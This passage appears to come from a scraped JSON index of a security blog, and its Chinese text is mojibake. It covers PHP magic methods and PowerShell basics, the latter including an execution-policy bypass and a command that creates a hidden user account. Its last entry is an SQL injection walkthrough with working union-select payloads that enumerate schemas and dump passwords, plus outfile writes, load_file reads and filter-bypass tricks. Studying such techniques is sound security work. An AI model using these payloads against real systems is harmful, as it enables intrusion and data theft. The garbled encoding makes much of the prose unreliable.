&quot;æˆ‘å«ï¼š&quot;.this-&gt;name.&quot;ï¼Œæ€§åˆ«ï¼š&quot;.$this-&gt;sex.&quot;ï¼Œå¹´é¾„ï¼š&quot;.$this-&gt;age; }}$Person = new Person();echo $Person-&gt;say();?&gt;//è¾“å‡ºç»“æœæˆ‘å«ï¼šå¼ ä¸‰ï¼Œæ€§åˆ«ï¼šç”·ï¼Œå¹´é¾„ï¼š22 __destruct() ææ„å‡½æ•° php çš„æ‰§è¡Œå·¥ä½œæµæ˜¯å½“å‰ç«¯è¿›ç¨‹è°ƒç”¨åç«¯çš„ php ç¨‹åºé˜¶æ®µæ€§å®Œæˆæ—¶ï¼ˆä¾‹å¦‚é¡µé¢åŠ è½½å®Œæˆï¼Œè°ƒç”¨ php ä¹Ÿç»“æŸäº†ï¼‰ï¼Œå…¶ä¸­ç±»å°±ä¼šé€ä¸€é”€æ¯ï¼Œè€Œè¯¥å‡½æ•°å¯ä»¥åœ¨é”€æ¯ä¹‹å‰æ‰§è¡Œä¸€äº›å…³é—­æ–‡ä»¶ï¼Œé‡Šæ”¾å†…å­˜ç­‰ç»“æŸæ€§æ“ä½œ ä¾‹å¦‚ï¼š 123456789101112131415&lt;?phpclass Person{ public $name; public function __destruct() { echo &quot;waiting!&quot; }}$Person = new Person();unset($Person); //æ‰‹åŠ¨é”€æ¯Personå¯¹è±¡ï¼Œæ³¨æ„è¿™ä¸ªä¸æ˜¯__unset()é‡è½½æ–¹æ³•?&gt;//è¾“å‡ºç»“æœwaiting! é‡è½½æ–¹æ³•å±æ€§é‡è½½__set() åœ¨ç»™ä¸å¯è®¿é—®ï¼ˆ protected æˆ– private ï¼‰æˆ–ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼æ—¶ï¼Œ__set() ä¼šè¢«è°ƒç”¨ã€‚ __get() è¯»å–ä¸å¯è®¿é—®ï¼ˆ protected æˆ– private ï¼‰æˆ–ä¸å­˜åœ¨çš„å±æ€§çš„å€¼æ—¶ï¼Œ__get()ä¼šè¢«è°ƒç”¨ã€‚ __isset() å½“å¯¹ä¸å¯è®¿é—®ï¼ˆ protected æˆ– private ï¼‰æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨ isset() æˆ– empty() æ—¶ï¼Œ__isset() ä¼šè¢«è°ƒç”¨ã€‚ __unset() å½“å¯¹ä¸å¯è®¿é—®ï¼ˆ protected æˆ– private ï¼‰æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨ unset() æ—¶ï¼Œ__unset() ä¼šè¢«è°ƒç”¨ã€‚ æ–¹æ³•é‡è½½__call()åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__call() ä¼šè¢«è°ƒç”¨ã€‚ __callStatic()åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__callStatic() ä¼šè¢«è°ƒç”¨ã€‚ __toString() è¢«å½“ä½œå­—ç¬¦ä¸²æ—¶è°ƒç”¨æ–¹æ³• è¯¥æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚ä¾‹å¦‚ï¼š12345678910111213141516171819202122&lt;?php // å£°æ˜ä¸€ä¸ªç®€å•çš„ç±» class TestClass { public $foo; public function __construct($foo) { $this-&gt;foo = $foo; } public function __toString() { return $this-&gt;foo; } } $class = new TestClass('Hello'); echo $class; ?&gt;//è¾“å‡ºç»“æœHello __invoke() æ–¹æ³• å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ ä¾‹å¦‚ï¼š 123456789101112131415&lt;?php class CallableClass { function __invoke($x) { var_dump($x); } } $obj = new CallableClass; $obj(5); var_dump(is_callable($obj)); ?&gt;//è¾“å‡ºç»“æœint(5)bool(true) __sleep() åºåˆ—åŒ–ç‰¹æŒ‡æ–¹æ³•![[php åºåˆ—åŒ–åŠååºåˆ—åŒ–#åºåˆ—åŒ–ç‰¹åˆ«çš„é­”æœ¯æ–¹æ³•- __sleep()]] __wakeup() ååºåˆ—åŒ–å˜æ›´æ–¹æ³•![[php åºåˆ—åŒ–åŠååºåˆ—åŒ–#ååºåˆ—åŒ–ç‰¹åˆ«çš„é­”æœ¯æ–¹æ³•- __wakeup()]]","link":"/2022/02/25/php%20%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"},{"title":"A simple summary of Powershell Script","text":"powshell å­¦ä¹ 0x00.åŸºæœ¬ cmd çš„å‘½ä»¤åœ¨ ps é‡Œéƒ½èƒ½ç”¨ å¯ä»¥ç›´æ¥è¿›è¡Œè®¡ç®— å¯ä»¥å±æ€§è°ƒè‰² å¯ä»¥ç”¨ tab é”®è¡¥å…¨å‘½ä»¤ å¯ä»¥ä½¿ç”¨ç®¡é“ç¬¦(|)å°†ä¸Šä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºæ”¾åˆ°ä¸‹ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥é‡Œå» å¯ä»¥ä½¿ç”¨&gt;ï¼ˆè¦†ç›–ï¼‰,&gt;&gt;ï¼ˆè¿½åŠ ï¼‰ çš„é‡å®šå‘ç¬¦ åŠ¨åè¯æ–¹å¼æ¥ä½¿ç”¨å‘½ä»¤ï¼Œä¾‹å¦‚ get-process get-services å˜é‡å’Œ php å¾ˆç±»ä¼¼åˆ$å¼€å¤´ å˜é‡å¯ä»¥æ˜¯å‘½ä»¤å˜é‡ä¸éœ€è¦æå‰å£°æ˜ æ¡ä»¶è¯­å¥æ²¡åˆ†å· å¯ä»¥å•åŒå¼•å·äº’ç›¸åµŒå¥— è½¬ä¹‰ä¸å†æ˜¯ \\ï¼Œè€Œæ˜¯ ` ![[CMDä¸‹æ‰§è¡Œps1è„šæœ¬]] 0x01.å…¶ä»–æ‰“å¼€å¯ä»¥è°ƒç”¨è„šæœ¬ç¨‹åºæƒé™1234567891011121314è„šæœ¬æƒé™é€šè¿‡ -executionpolicy æ›´æ”¹è·å–ä½¿ç”¨get-executionpolicyæœ‰ä»¥ä¸‹å‡ ä¸ªï¼šRestricted è„šæœ¬ä¸èƒ½è¿è¡Œ(é»˜è®¤)RemoteSigned æœ¬åœ°åˆ›å»ºçš„å¯è¿è¡Œï¼Œç½‘ä¸Šä¸‹è½½çš„ä¸è¡Œï¼ˆé™¤éæœ‰è¯ä¹¦ï¼‰Allsigned æœ‰å—ä¿¡ä»»è€…é¢å‘çš„ç­¾åæ‰èƒ½è¿è¡ŒUnrestricted å…¨èƒ½è¿è¡Œä½¿ç”¨-executionpolicy bypass æ¥ç»•è¿‡å®‰å…¨ç­–ç•¥set-executionpolicy RemoteSigned #é€‰æ‹©å…¨æ˜¯ï¼ˆaï¼‰ç®¡ç†å‘˜è¿è¡Œcmdï¼Œè¾“å…¥powershellè¿›å»å†æ¬¡æ‰§è¡Œ set-executionpolicy RemoteSigned å°±å¥½äº† è¿è¡Œè„šæœ¬ç¨‹åºæ—¶ç”¨ .\\1.bat æˆ–è€… .\\1.ps1 çš„æ–¹å¼ ä»è½¯ä»¶è®¾ç½®æ›´æ”¹ Powershell é»˜è®¤è·¯å¾„1ã€åœ¨æ–‡æ¡£ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå‘½åä¸º WindowsPowerShell 2ã€åœ¨åˆšå»ºç«‹çš„ WindowsPowerShell é‡Œè¾¹æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå«åš profile.ps1 3ã€ç¼–è¾‘ profile.ps1 å†™å…¥ 1set-location C:\\Users\\... //ä½ çš„é»˜è®¤è·¯å¾„ å¹¶ä¿å­˜ 4ã€ç®¡ç†å‘˜æ¨¡å¼æ‰“å¼€ Powershellï¼Œè¾“å…¥ 123set-executionpolicy remotesignedç„¶åè¾“å…¥Yï¼Œå›è½¦ é‡å¯ Powershell å°±æ›´æ”¹å®Œæˆäº† 0x02.è´¦æˆ·ç›¸å…³Windos ä¸‹çš„ç”¨æˆ·è´¦å·ä¿¡æ¯æ˜¯åœ¨ C: \\Windows\\system32\\config\\SAM é‡Œè¾¹çš„ æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„ SID 1whoami /user ç”¨æˆ· Windows é»˜è®¤è´¦æˆ·æ˜¯ Administratorï¼ŒGuest è´¦æˆ·æ˜¯é»˜è®¤å…³é—­çš„ åŸºæœ¬å‘½ä»¤ 12345net user //æŸ¥çœ‹ç³»ç»Ÿè´¦æˆ·net user resek4 //æŸ¥çœ‹ç”¨æˆ·çš„å±æ€§ä¿¡æ¯net user resek4 123456 /add //æ·»åŠ ä¸€ä¸ªç”¨æˆ·åæ˜¯resek4ï¼Œå¯†ç æ˜¯123456çš„Guestç”¨æˆ·net user resek4$ 123456 /add //æ·»åŠ ä¸€ä¸ªç”¨æˆ·åæ˜¯resek4çš„éšè—ç”¨æˆ·net user resek4 /del //åˆ é™¤resek4ç”¨æˆ· ç”¨æˆ·ç»„ Administrators ç»„å†…çš„ç”¨æˆ·ï¼Œéƒ½å…·å¤‡ç³»ç»Ÿç®¡ç†å‘˜çš„æƒé™ Guests æ˜¯æä¾›ç»™æ²¡æœ‰ç”¨æˆ·è´¦æˆ·ä½†æ˜¯éœ€è¦è®¿é—®æœ¬åœ°è®¡ç®—æœºèµ„æºçš„ç”¨æˆ·ä½¿ç”¨çš„Users ç»„å†…çš„æˆå‘˜åªæ‹¥æœ‰ä¸€äº›è¿è¡Œç¨‹åºçš„æƒåˆ©ï¼Œä½†æ˜¯ä¸èƒ½æ›´æ”¹è®¾ç½®ï¼Œä¸èƒ½å…³é—­è®¡ç®—æœºPower Users ç»„å†…æˆå‘˜æƒåˆ©å¤šäº Usersï¼Œå°‘äº AdministratorsRemote Desktop ç»„å†…çš„æˆå‘˜æ‹¥æœ‰è¿œç¨‹ç™»å½•æƒé™ï¼ˆAdministrator æ˜¯é»˜è®¤å°±æœ‰çš„ï¼‰ åŸºæœ¬å‘½ä»¤ 123456net localgroup //æŸ¥çœ‹ç³»ç»Ÿå’Œç»„net localgroup resek //æŸ¥çœ‹resekç»„å†…çš„æˆå‘˜net localgroup resek /add //æ·»åŠ ä¸€ä¸ªå«resekçš„ç»„net localgroup resek resek4 /add //å‘resekç»„é‡Œæ·»åŠ ä¸€ä¸ªresek4çš„ç”¨æˆ·net localgroup resek resek4 /del //åˆ é™¤resekç»„é‡Œresek4æˆå‘˜net localgroup resek /del //åˆ é™¤resekç»„ 0x03.å‘½ä»¤åŸºæœ¬å‘½ä»¤12345678910111213141516171819202122232425262728293031323334353637383940414243$psversiontable #powershellæ¯ä¸ªwindowsç‰ˆæœ¬æœ‰åŒºåˆ«ï¼Œè¿™ä¸ªå‘½ä»¤å¯ä»¥çœ‹powershellçš„ç‰ˆæœ¬get-service #è·å–è®¡ç®—æœºè¯¦ç»†çš„æœåŠ¡åŠçŠ¶æ€#ç­‰åŒäºåœ¨cmdé‡Œè¾“å…¥service.mscget-process #è·å–æ‰€æœ‰è¿›ç¨‹ä¿¡æ¯get-alias #è·å–å½“å‰ä¼šè¯çš„åˆ«åget-history #è·å–è¾“å…¥å‘½ä»¤å†å²get-date #è·å–æ—¶é—´get-command #è·å–æ‰€æœ‰å‘½ä»¤#ä¹Ÿå¯ä½¿ç”¨gcmåˆ«åget-childitem #è·å–å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯ï¼Œç­‰åŒäºdirï¼Œlsls | format-table name,mode #å°†lsé‡Œçš„nameä¸modeæ ¼å¼åŒ–è¾“å‡º ls | format-table name,mode &gt; 1.txt #å°†è¾“å…¥å†…å®¹é‡å®šå‘åˆ°1.txté‡Œè¾¹type 1.txt #æ‰“å°å†…å®¹åˆ°å±å¹•ä¸Š netstat -ano #æ‰“å°æ‰€æœ‰ç½‘ç»œä¿¡æ¯route print #æ‰“å°æ‰€æœ‰è·¯ç”±ä¿¡æ¯start notepad #æ‰“å¼€è®°äº‹æœ¬ï¼Œæ‰€æœ‰æ”¾åœ¨windows/system32 é‡Œçš„æ–‡ä»¶éƒ½å¯ä»¥è¢«æ‰“å¼€ $env.path #è¾“å‡ºç³»ç»Ÿå˜é‡$env:windir #æ‰“å°æŸä¸ªç¯å¢ƒå˜é‡çš„å€¼ls variable #æŸ¥çœ‹å½“å‰test-path variable:num1 #æŸ¥æ‰¾å˜é‡æ˜¯å¦å­˜åœ¨ del variable:num1 #åˆ é™¤å˜é‡$pid #æ‰“å°å½“å‰è¿›ç¨‹çš„pid [environment]::setenvironmentvariable(&quot;PATH&quot;,&quot;E:\\&quot;,&quot;User&quot;) #æ°¸ä¹…å¢åŠ ç”¨æˆ·çš„ç¯å¢ƒå˜é‡ åŸºæœ¬è¿ç®—åŠå‡½æ•°1234567891011121314151617181920212223242526#æ¡ä»¶åˆ¤æ–­if(){} else{}if(){} elseif(){} else{}# å®šä¹‰æ•°ç»„$arr=1..10$arr=1,2,3,4,5,6,7,8,9,10#ä¹Ÿå¯ä»¥å°†ipconfigç­‰å‘½ä»¤èµ‹å€¼ç»™ä¸€ä¸ªæ•°ç»„ï¼Œç„¶ååæœŸé—´æ¥è¾“å‡º#å¾ªç¯foreach($i in $arr){}while(){}do{}while()#è‡ªå®šä¹‰å‡½æ•°function test(){}read-host &quot;&quot; #è¯»å–ç”¨æˆ·è¾“å…¥ï¼Œæœªæ¥è¾“å‡ºå¯ä»¥ç›´æ¥åœ¨å¼•å·é‡Œæ”¾å˜é‡$str.split(&quot;\\&quot;).gettype()split()å¯åˆ†éš”ä¿¡æ¯ï¼Œgettype()å¯æ‰“å°ä¿¡æ¯#è·å–å­—ç¬¦ä¸²å›¾ç‰‡åç§°$str=&quot;https://www.abc.com/haha/hello.png&quot;$str.split(&quot;\\&quot;)[-1] å³å¯è·å¾—hello.png åˆ«å12345678910get-alias -name ls#è·å–lsåˆ«åï¼Œå³ä¼šå›æ˜¾get-childitemget-alias | where{$_.definition.startswitch(&quot;Remove&quot;)}# $_è¡¨ç¤ºå½“å‰çš„å…ƒç´ ï¼Œdefinition å®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ç±»å‹ã€‚Powershellæ”¯æŒ.netå¼ºå¤§çš„ç±»åº“ï¼Œé‡Œé¢çš„definitionåŒ…æ‹¬å­—ç¬¦ä¸²startswithæ“ä½œï¼Œè·å–å­—ç¬¦ä¸²å¼€å¤´å‡½æ•°ã€‚set-alias -name notepad -value pad #å°†notepadçš„åˆ«åè®¾ç½®ä¸ºpad,å…³é—­pså°±ä¼šå¤±æ•ˆdel alias:pad #åˆ é™¤åˆ«åexport-alias 1.ps #ä¿å­˜åˆ«å 0x04.æ³¨å†Œè¡¨ç›¸å…³ HKEY_CLASSES_ROOTï¼šå®šä¹‰æ–‡æ¡£çš„ç±»å‹\\ç±»ä»¥åŠä¸ç±»å‹å…³è”çš„ä¿¡æ¯ä»¥åŠ COM ç»„ä»¶çš„é…ç½®æ•°æ® HKEY_CURRENT_USERï¼šåŒ…å«å½“å‰ç™»å½•åˆ° Windows çš„ç”¨æˆ·çš„é…ç½®ä¿¡æ¯ HKEY_LOCAL_MACHINEï¼šåŒ…å«ä¸è®¡ç®—æœºç›¸å…³çš„é…ç½®ä¿¡æ¯,ä¸ç®¡ç”¨æˆ·æ˜¯å¦ç™»å½• HKEY_USERSï¼šåŒ…å«æœ‰å…³é»˜è®¤ç”¨æˆ·é…ç½®çš„ä¿¡æ¯ HKEY_CURRENT_CONFIGï¼šåŒ…å«æœ‰å…³éç”¨æˆ·ç‰¹å®šçš„ç¡¬ä»¶çš„é…ç½®ä¿¡æ¯ 123456789å¯ä»¥ç›´æ¥cd hkcu:æ¥è¿›å…¥hkcuæ³¨å†Œè¡¨ï¼Œlså³å¯æ‰“å°# è¯»å–é”®å€¼get-itemproperty#è®¾ç½®é”®å€¼set-itemproperty","link":"/2020/11/02/powershell/"},{"title":"SQL Injection Hacking Flow","text":"sql æ³¨å…¥æ­¥éª¤0x00.åˆ¤æ–­æ³¨å…¥ç‚¹1.å¦‚æœç›®æ ‡æœ‰ get æ³¨å…¥ï¼Œåˆ™ä¼šåœ¨ url ä¸Šæœ‰æ˜æ˜¾ä¼ å‚çš„æ³¨å…¥ç‚¹ï¼Œæ¯”æ–¹è¯´ï¼š 1/index.php?id=1 å¦‚æœæ²¡æœ‰åœ¨ç›®æ ‡ url ä¸Šå‘ç°æ˜æ˜¾çš„ get æ³¨å…¥ï¼Œåˆ™å¾ˆæœ‰å¯èƒ½æ˜¯ post æ³¨å…¥ï¼Œåœ¨ post é‡Œè¾¹ä¼ å‚å°±å¥½äº† 2.é€šè¿‡åœ¨ä¼ å‚çš„æ•°å­—æˆ–æ˜¯å­—ç¬¦ä¸²åè¾¹åŠ å•å¼•å·ï¼Œçœ‹ä¼šä¸ä¼šæ¡†æ¶è¿˜åœ¨ä½†æ•°æ®ä¸åœ¨äº†ï¼Œå†åŠ ä¸Šäº•å·ï¼Œçœ‹ä¸åœ¨çš„æ•°æ®ä¼šä¸ä¼šæ¢å¤ï¼Œä»¥æ­¤æ¥åˆ¤æ–­æ˜¯å¦æœ‰æ³¨å…¥ç‚¹ 3.å¦‚æœç¬¬äºŒæ­¥ä¸æˆåŠŸï¼Œå¯ä»¥ä½¿ç”¨ id=1 and 1=1 ä¸ id=1 and 1=2 æ¥çœ‹ä¸¤æ¬¡é¡µé¢æ˜¯å¦æœ‰ä¸åŒçš„å›æ˜¾ï¼Œæœ‰çš„è¯è¯´æ˜ and åçš„è¯­å¥è¢«æ‰§è¡Œäº†ï¼Œæœ‰æ³¨å…¥ã€‚ 4.ä¸ªåˆ«æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨ id=1 and sleep(5)æ¥çœ‹ï¼Œå¦‚æœæœ‰ 5 ç§’å»¶è¿Ÿï¼Œè¯´æ˜æœ‰æ³¨å…¥ã€‚ 0x01.ä½¿ç”¨ order by è¯­å¥æ¥åˆ¤æ–­åˆ—æ•°1id=1' order by 4%23 å¯ä»¥ä½¿ç”¨äºŒåˆ†æ³•æ¥æ¨æµ‹åˆ—æ•° 0x02.åˆ¤æ–­å›æ˜¾ç‚¹ä»æ­¤æ—¶å¼€å§‹ï¼Œå°±è¦ä½¿ url å‰é¢çš„æŸ¥è¯¢å¤±æ•ˆï¼Œåªæ‰§è¡Œä½  union select çš„è¯­å¥æ–¹æ³•æ˜¯ä¼ ä¸€ä¸ªé”™è¯¯æ•°æ®å°†å‰é¢çš„æŸ¥è¯¢å¤±æ•ˆï¼Œå¯ä»¥æ˜¯ 0 å¯ä»¥æ˜¯è´Ÿæ•° 1id=-1' union select 1,2,3,4%23 æ‰¾åˆ°å›æ˜¾ç‚¹ä»¥åï¼Œå¯ä»¥ä½¿ç”¨ database(),user(),version()ç­‰å‡½æ•°æ¥è¯æ˜å›æ˜¾ç‚¹çš„å¯ç”¨æ€§ 0x03.æŸ¥è¯¢æ•°æ®åº“å å¯ä»¥ä½¿ç”¨ group_concat()å‡½æ•°æ¥å°†å¤šåˆ—æ•°æ®æ•´åˆåˆ°ä¸€åˆ— 1id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata),4%23 0x04.æŸ¥è¯¢è¡¨å1id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=0x746573745f736368656d61),4%23 æŸ¥è¯¢è¡¨åæ—¶åªéœ€è¦åšä¸€æ¬¡ where é™åˆ¶ï¼Œä½†æ˜¯é™åˆ¶åå­—ä¸€å®šè¦ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œå¹¶åŠ ä¸Š 0x 0x05.æŸ¥è¯¢åˆ—å1id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=0x746573745f736368656d61 and table_name=0x746573745f7461626c65),4%23 æŸ¥è¯¢åˆ—åæ—¶éœ€è¦åšä¸¤æ¬¡ where é™åˆ¶ï¼Œä¸€æ¬¡æ˜¯ table_schemaï¼ˆè¡¨çš„æ•°æ®åº“åï¼‰ï¼Œä¸€æ¬¡æ˜¯ table_nameï¼ˆè¡¨çš„åå­—ï¼‰ï¼Œä¸”éƒ½è¦ç”¨åå…­è¿›åˆ¶è¡¨ç¤º 0x06.æŸ¥è¯¢æ•°æ®12id=-1' union select 1,2,(select group_concat(id,0x7c,password) from test_schema.test_table),4%23ï¼ˆä¸å¯¹å¯ä»¥å°è¯•å°†test.schemaçš„è¿™ä¸ªå‰ç¼€å»æ‰ï¼‰ åœ¨ group_concat()é‡Œå†™å…¥è¦æŸ¥è¯¢æ•°æ®çš„åˆ—åï¼Œfrom çš„è¡¨åä¹Ÿç›´æ¥å¯ä»¥ç”¨æ— éœ€è½¬è¿›åˆ¶çš„æœ¬åè¡¨ç¤ºäº†ï¼ˆæ•°æ®åº“å.è¡¨åï¼‰ è€Œä¸”ç”±æ­¤å¯è§ï¼Œgroup_concat å‡½æ•°é‡Œå¯ä»¥é€šè¿‡åŠ ä¸Šåå…­è¿›åˆ¶çš„ç‰¹æ®Šç¬¦å·æ¥åˆ†éš”åˆ—åï¼Œä»¥è¾¾åˆ°åˆ†éš”è¦æŸ¥è¯¢çš„æ•°æ®çš„æ•ˆæœ sql æ³¨å…¥æŠ€å·§ Bypass: (1)å•å¼•å·æˆ–è€…åˆ«çš„ä»€ä¹ˆå­—ç¬¦ï¼šåå…­è¿›åˆ¶ç¼–ç ('abc'==0x616263)(2)ç©ºæ ¼ï¼š/**/ (3)å…³é”®å­—ï¼šé¢„ç¼–è¯‘è¯­å¥æ›¿æ¢(4)and æˆ– orï¼š&amp;&amp; || æˆ–è€…å°† and æˆ– or ç”¨ ascii ç¼–ç ååŠ ä¸Š%ï¼ˆå³å˜æˆå­—æ¯çš„ url ç¼–ç è¿›è¡Œç»•è¿‡ï¼‰(5)â€™!=â€™ï¼šâ€™&lt;&gt;â€™(6)â€™=â€™id = 1ï¼šid between 1 and 1like 0x00.Tips sql å¯ä»¥ä½¿ç”¨å†™æ–‡ä»¶ 12345select 1,&quot;è·å¾—çš„å€¼&quot;,3 into outfile &quot;ç»å¯¹è·¯å¾„&quot; --+1.å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„ï¼ˆè·¯å¾„è¦æ˜¯æ–œæ ä¸èƒ½æ˜¯åæ–œæ \\ï¼Œä¸ç„¶ä¼šè¢«å½“æˆè½¬ä¹‰ï¼‰ 2.å¿…é¡»æ˜¯æœ€é«˜æƒé™ï¼ˆä¸ä¸€å®šæ˜¯rootï¼‰ 3.ä½¿ç”¨è¯»å†™æ–‡ä»¶æ—¶ï¼Œmy.ini ä¸­çš„ mysqld å¿…é¡»æœ‰ secure-file-priv å‚æ•°ï¼Œå¦‚æœæ²¡æœ‰å¿…é¡»åŠ ä¸Šï¼Œå¦‚æœæœ‰ï¼Œè¦ä¸å°†å†™çš„æ–‡ä»¶æ”¾åˆ°è¿™ä¸ªå‚æ•°çš„é»˜è®¤è·¯å¾„é‡Œï¼Œè¦ä¸ä¿®æ”¹è¿™ä¸ªè·¯å¾„ è¯»æ–‡ä»¶ 1234select 1,load_file(0x123123),3 --+è¯»æ–‡ä»¶æ—¶éœ€è¦å°†ç»å¯¹è·¯å¾„è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç æœ€ååœ¨load_file()çš„å¤–å±‚è¿˜å¯ä»¥åŒ…ä¸€ä¸ªhex()ï¼Œè¿™æ ·å³ä¾¿æ˜¯ä¸­æ–‡ï¼Œä¹Ÿå¯ä»¥åæœŸè§£ç è¿™ä¸ªè·¯å¾„å¯¹åæ–œæ æ²¡æœ‰è¦æ±‚ sqlmap å¯ä»¥å»è·‘ä¸€ä¸ªé¡µé¢çš„ php æ–‡ä»¶ï¼ˆä¸å¸¦ä»»ä½•å‚æ•°é‚£ç§ï¼‰ï¼Œç„¶ååŠ ä¸Šâ€“forms å‚æ•°æ¥è‡ªåŠ¨å¯»æ‰¾é¡µé¢å¯èƒ½å­˜åœ¨çš„è¡¨å• è™½ç„¶å…³é”®å­—ä¸èƒ½è¢«åå…­è¿›åˆ¶ç¼–ç ï¼Œä½†æ˜¯æŸ¥è¯¢çš„å­—ç¬¦ä¸²å¯ä»¥è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç ï¼Œå¹¶ç­‰ä»·äºåŸå­—ç¬¦ä¸² æ³¨å…¥æ—¶ï¼Œå…ˆå¼•å·ï¼Œç„¶åä¸‡èƒ½å¯†ç ï¼Œç„¶å order byï¼Œç„¶å union select å»æ­£å¸¸æ³¨å…¥ã€‚çœ‹ä¸­é€”å›æ˜¾è¦æ±‚ï¼Œå°è¯•å †å ï¼ŒæŠ¥é”™ç­‰å…¶ä»–æ³¨å…¥é€”å¾„ æ³¨å…¥æ—¶å¦‚æœéœ€è¦æœ‰=è¿™æ ·çš„å­—ç¬¦ï¼Œä¸çŸ¥é“å…¨åçš„æ—¶å€™ï¼Œ=å¯ä»¥æ¢æˆ likeï¼Œç„¶åä¸çŸ¥é“çš„åœ°æ–¹ç”¨% é€šé…ï¼Œç„¶ååå…­è¿›åˆ¶è½¬æ¢ 1where table_schema like %all% //allé‚£é‡Œå†è½¬æˆåå…­è¿›åˆ¶ å¯ä»¥ä½¿ç”¨ exists(select â€¦)æ¥æ’æŸ¥è¿‡æ»¤æˆ–è€…æš´åŠ›çŒœè§£è¡¨å 123id=1' and exists(select * from admin)--+ //å¯¹adminè¿›è¡Œburpçˆ†ç ´ æ³¨å…¥æ—¶æœ€å¥½å»æŠ“åŒ…ç”¨-r æ³¨å…¥ï¼Œå› ä¸ºè¿™æ ·å¯ä»¥å¸¦ä¸Š User-Agent æ¶ˆæ¯å¤´ æ³¨å…¥æ—¶æœ‰å¯èƒ½ä½ åŠ ä¸Šâ€“random-agent è¿™ä¸ªè‡ªåŠ¨æ›´æ”¹æ¶ˆæ¯å¤´çš„å‚æ•°ä¼šæé«˜æˆåŠŸç‡ sql æ³¨å…¥çš„æ—¶å€™ä¸å…‰å¯æ³¨å…¥ GETï¼ŒPOSTï¼Œè¿˜å¯ä»¥æŠ“åŒ…æ³¨å…¥æ•°æ®éƒ¨åˆ†çš„å‚æ•°ï¼ˆåŠ  * ï¼‰ ç”¨ä¸äº† substr å¯ä»¥ç”¨ mid æ›¿æ¢ï¼Œæ•ˆæœä¸€æ · strstr()ä¸åŒºåˆ†å¤§å°å†™ 0x01.äº¦æˆ–æ³¨å…¥å½“ä¸çŸ¥é“æ³¨å…¥æ—¶å“ªäº›å‚æ•°è¢«è¿‡æ»¤çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨äº¦æˆ–æ³¨å…¥äº¦æˆ–ç¬¦å·ä¸º^ï¼Œå…¶è¿ç®—è§„åˆ™æ˜¯ç›¸åŒä¸ºçœŸï¼Œç›¸å¼‚ä¸ºå‡ æ³¨å…¥æ—¶ä½¿ç”¨ length()å‡½æ•°è¿›è¡Œåˆ¤æ–­ï¼Œlength()å†…éƒ¨æ˜¯è¢«è€ƒå¯Ÿæœ‰å¯èƒ½è¿‡æ»¤æ‰çš„å‚æ•°å¦‚æœé¡µé¢æ­£å¸¸è¿”å›ï¼Œåˆ™è¯´æ˜è¢«å‚æ•°è¿‡æ»¤æ‰äº† 123index.php?id=5'^(length('and')!=0)%23åŸç†å³æ˜¯ï¼šå¦‚æœandè¢«è¿‡æ»¤æ‰äº†ï¼Œlength('and')å³ä¸º0,0!=0æ˜¾ç„¶ç»“æœæ˜¯0ï¼Œè€Œå‰é¢çš„å€¼ä¸ºçœŸï¼ˆ'5'ï¼‰ï¼ŒäºŒè€…ç›¸å¼‚ï¼Œæ•´ä¸ªè¯­å¥çš„å€¼ä¸º1ï¼Œæ‰€ä»¥é¡µé¢æ­£å¸¸è¿”å› å¦‚æœ%23ï¼ˆ#ï¼‰ä¹Ÿè¢«è¿‡æ»¤æ‰äº†ï¼Œå¯ä»¥å°è¯•å†åŠ ä¸€æ¬¡äº¦æˆ– 123index.php?id=5'^(length('and')!=0)^'å› ä¸ºæ·»åŠ çš„åå¼•å·ä¸phpæ–‡ä»¶é‡Œçš„è¯­å¥ä¸€æ—¦åˆå¹¶,å†…éƒ¨å³å½¢æˆäº†''ï¼ˆç©ºå€¼ï¼‰ï¼Œæ‰€ä»¥æ˜¾ç„¶ä¸º0ï¼Œä¸å‰é¢çš„ç»“æœ1è¿˜æ˜¯ç›¸å¼‚çš„ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥æ­£å¸¸è¿”å›æ¥åˆ¤æ–­è¿‡æ»¤ 0x02.æŠ¥é”™æ³¨å…¥æŠ¥é”™æ³¨å…¥å‰ææ˜¯åœ¨åç«¯ä»£ç æœ‰ Exception è¿™ç§å¼‚å¸¸å¤„ç†çš„å›æ˜¾æ‰èƒ½åœ¨ web ä¸­ç”¨ï¼Œä¸ç„¶å³ä½¿èƒ½æŠ¥é”™ä½†æ˜¯ä½ ä¸çŸ¥é“æŠ¥é”™å†…å®¹ æŠ¥é”™æ³¨å…¥æœ‰åç§ï¼Œè¯¦è§ï¼šhttps://www.cnblogs.com/wocalieshenmegui/p/5917967.html æœ€å¸¸ç”¨çš„æ˜¯ 123floor()updatexml()extractvalue() updatexml() æ­¤å‡½æ•°æ ¼å¼ä¸º 